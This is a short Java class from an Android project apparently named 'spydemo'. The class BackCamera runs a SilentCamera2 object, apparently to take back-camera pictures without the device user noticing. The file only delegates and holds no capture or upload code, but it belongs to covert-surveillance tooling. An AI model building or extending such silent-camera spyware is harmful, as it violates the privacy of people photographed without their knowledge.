package com.spy.spydemo;

import android.content.Context;

public class BackCamera implements Runnable {
    private Context context;

    public BackCamera(Context context) {
        this.context = context;
    }

    @Override
    public void run() {
        SilentCamera2 camera = new SilentCamera2(this.context);
        camera.run(false);
    }
}